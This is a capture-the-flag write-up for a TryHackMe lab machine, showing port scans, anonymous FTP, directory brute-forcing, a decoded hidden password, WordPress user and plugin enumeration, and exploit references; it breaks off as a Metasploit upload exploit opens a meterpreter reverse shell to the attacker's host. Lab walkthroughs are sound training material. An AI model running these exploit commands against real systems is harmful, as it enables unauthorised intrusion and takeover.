---
This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access.
---

# All in One — Writeup

## Overview
### All in One — Writeup
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/915c0170a4d0a50cac23bac0f0b1f739.png)
### Hack the machine !
Start Machine
This box's intention is to help you practice **several** ways in exploiting a system. There is few **intended** paths to exploit it and few **unintended** paths to get root.
Try to discover and exploit them all. **Do not** just exploit it using intended paths, hack like a **pro** and **enjoy** the box !
_Give the machine about 5 mins to fully boot._
**Twitter:** i7m4d
Answer the questions below

## Enumeration
```text
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.157.71 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.157.71:21
Open 10.10.157.71:22
Open 10.10.157.71:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-25 12:16 EST
Nmap wishes you a merry Christmas! Specify -sX for Xmas Scan (https://nmap.org/book/man-port-scanning-techniques.html).
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
Initiating Ping Scan at 12:16
Scanning 10.10.157.71 [2 ports]
Completed Ping Scan at 12:16, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:16
Completed Parallel DNS resolution of 1 host. at 12:16, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:16
Scanning 10.10.157.71 [3 ports]
Discovered open port 22/tcp on 10.10.157.71
Discovered open port 80/tcp on 10.10.157.71
Discovered open port 21/tcp on 10.10.157.71
Completed Connect Scan at 12:16, 0.20s elapsed (3 total ports)
Initiating Service scan at 12:16
Scanning 3 services on 10.10.157.71
Completed Service scan at 12:16, 6.43s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.157.71.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:16
NSE: [ftp-bounce 10.10.157.71:21] PORT response: 500 Illegal PORT command.
Completed NSE at 12:16, 5.76s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 1.40s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
Nmap scan report for 10.10.157.71
Host is up, received syn-ack (0.19s latency).
Scanned at 2022-12-25 12:16:26 EST for 14s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e25c3322765c9366cd969c166ab317a4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLcG2O5LS7paG07xeOB/4E66h0/DIMR/keWMhbTxlA2cfzaDhYknqxCDdYBc9V3+K7iwduXT9jTFTX0C3NIKsVVYcsLxz6eFX3kUyZjnzxxaURPekEQ0BejITQuJRUz9hghT8IjAnQSTPeA+qBIB7AB+bCD39dgyta5laQcrlo0vebY70Y7FMODJlx4YGgnLce6j+PQjE8dz4oiDmrmBd/BBa9FxLj1bGobjB4CX323sEaXLj9XWkSKbc/49zGX7rhLWcUcy23gHwEHVfPdjkCGPr6oiYj5u6OamBuV/A6hFamq27+hQNh8GgiXSgdgGn/8IZFHZQrnh14WmO8xXW5
|   256 1b6a36e18eb4965ec6ef0d91375859b6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Ww9ui4NQDHA5l+lumRpLsAXHYNk4lkghej9obWBlOwnV+tIDw4mgmuO1C3U/WXRgn0GrESAnMpi1DSxy8t1k=
|   256 fbfadbea4eed202b91189d58a06a50ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOG6ExdDNH+xAyzd4w1G4E9sCfiiooQhmebQX6nIcH/
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.99 seconds

nothing
```
```text
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.157.71 
Connected to 10.10.157.71.
220 (vsFTPd 3.0.3)
Name (10.10.157.71:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||58792|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -lah
229 Entering Extended Passive Mode (|||31826|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> ls -lah
229 Entering Extended Passive Mode (|||36115|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp> quit
221 Goodbye.
```
```text
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.157.71/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.157.71/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/25 12:19:00 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.157.71/wordpress/]
/hackathons           (Status: 200) [Size: 197]
Progress: 21817 / 220561 (9.89%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2022/12/25 12:20:13 Finished
===============================================================

view-source:http://10.10.157.71/hackathons

<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>

<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->

https://cyberchef.io/#recipe=Vigen%C3%A8re_Decode('KeepGoing')&input=RHZjIFdAaXl1ckAxMjM

Try H@ckme@123

http://10.10.157.71/wordpress/

using wpscan
```
```text
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.10.157.71/wordpress -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.157.71/wordpress/ [10.10.157.71]
[+] Started: Sun Dec 25 12:25:03 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.157.71/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.157.71/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.157.71/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.157.71/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.157.71/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.157.71/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=============================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.157.71/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Dec 25 12:25:23 2022
[+] Requests Done: 64
[+] Cached Requests: 6
[+] Data Sent: 16.135 KB
[+] Data Received: 19.647 MB
[+] Memory used: 228.457 MB
[+] Elapsed time: 00:00:19

elyana

-   e enumerate
-   u users
-   ap all plugins
```
```text
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.10.157.71/wordpress -e ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.157.71/wordpress/ [10.10.157.71]
[+] Started: Sun Dec 25 12:29:21 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.157.71/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.157.71/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.157.71/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.157.71/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.157.71/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.157.71/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://10.10.157.71/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.157.71/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://10.10.157.71/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2021-03-10T02:38:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.157.71/wordpress/wp-content/plugins/reflex-gallery/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Dec 25 12:29:29 2022
[+] Requests Done: 6
[+] Cached Requests: 34
[+] Data Sent: 1.787 KB
[+] Data Received: 11.85 KB
[+] Memory used: 245.453 MB
[+] Elapsed time: 00:00:08

mail-masta 1.0

MailMasta es un plugin de WordPress que se utiliza para enviar correos masivos desde su sitio web. Con este plugin, puede crear campañas de correo electrónico, enviar boletines y noticias a sus suscriptores, y gestionar una lista de correo. También incluye herramientas de análisis para ver cómo están siendo utilizadas sus campañas de correo electrónico y cómo están siendo recibidas por sus destinatarios.

Con MailMasta, puede crear plantillas de correo electrónico personalizadas y segmentar su lista de correo para enviar correos personalizados a grupos específicos de suscriptores. También puede integrar el plugin con otras plataformas de correo electrónico populares, como Mailchimp, para enviar campañas de correo electrónico a través de esas plataformas.

En resumen, MailMasta es una herramienta útil para cualquier persona que desee enviar correos masivos a través de su sitio web de WordPress, ya sea para promocionar un producto o servicio, compartir noticias o actualizaciones, o simplemente mantenerse en contacto con sus suscriptores.

https://www.exploit-db.com/exploits/40290  (LFI)

reflex-gallery 3.1.7

Reflex Gallery es un plugin de WordPress que se utiliza para crear galerías de imágenes y videos en su sitio web de WordPress. Con este plugin, puede mostrar sus imágenes y videos de manera atractiva y fácil de navegar utilizando una variedad de diseños y opciones de personalización.

Para utilizar Reflex Gallery en su sitio web de WordPress, primero debe instalar y activar el plugin. Una vez hecho esto, puede crear una nueva galería desde su panel de administración de WordPress. Para hacerlo, vaya a "Galerías" y haga clic en "Añadir nueva". A continuación, puede seleccionar las imágenes y videos que desea incluir en su galería y personalizar la apariencia y el comportamiento de la galería utilizando las opciones disponibles.

Una vez que haya creado su galería, puede insertarla en su sitio web utilizando el shortcode proporcionado por el plugin o utilizando un widget de galería en su barra lateral o área de widget.

En resumen, Reflex Gallery es un plugin sencillo y fácil de usar que le permite crear galerías de imágenes y videos atractivas en su sitio web de WordPress de manera rápida y sencilla.

https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload/ (metasploit)

using first metasploit then LFI 

msfconsole es una interfaz de línea de comandos de la plataforma de explotación Metasploit. La opción "-x" se utiliza para ejecutar una serie de comandos de msfconsole de manera automática cuando se inicia msfconsole. Esto es útil si desea automatizar tareas o configuraciones comunes que realiza en msfconsole.

Por ejemplo, podría utilizar la opción "-x" para cargar un módulo de explotación específico, establecer una opción de configuración, o realizar una búsqueda en la base de datos de exploits. Por ejemplo:

msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.1; exploit"

En este ejemplo, msfconsole se inicia y carga automáticamente el módulo de explotación ms08_067_netapi, establece el valor de RHOST en 192.168.1.1 y luego lanza la explotación.

Es importante tener en cuenta que la opción "-x" es peligrosa si se utiliza de forma incorrecta, ya que permite ejecutar comandos de manera automática. Asegúrese de utilizarla de manera responsable y de entender completamente los comandos que está ejecutando.
```
```text
┌──(kali㉿kali)-[~]
└─$ msfconsole --help                                                                           
Usage: msfconsole [options]

Common options:
    -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'

Database options:
    -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
    -n, --no-database                Disable database support
    -y, --yaml PATH                  Specify a YAML file containing database settings

Framework options:
    -c FILE                          Load the specified configuration file
    -v, -V, --version                Show version

Module options:
        --defer-module-loads         Defer module loading unless explicitly asked
    -m, --module-path DIRECTORY      Load an additional module path

Console options:
    -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
    -H, --history-file FILE          Save command history to the specified file
    -l, --logger STRING              Specify a logger to use (Stderr, TimestampColorlessFlatfile, Flatfile, StdoutWithoutTimestamps, Stdout)
        --[no-]readline
    -L, --real-readline              Use the system Readline library instead of RbReadline
    -o, --output FILE                Output to the specified file
    -p, --plugin PLUGIN              Load a plugin on startup
    -q, --quiet                      Do not print the banner on startup
    -r, --resource FILE              Execute the specified resource file (- for stdin)
    -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
    -h, --help                       Show this message

code : https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/webapp/wp_reflexgallery_file_upload.rb
```
```text
┌──(kali㉿kali)-[~]
└─$ msfconsole -q -x "use exploit/unix/webapp/wp_reflexgallery_file_upload; set RHOST 10.10.157.71; set LHOST 10.8.19.103; set TARGETURI /wordpress/; exploit"
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
RHOST => 10.10.157.71
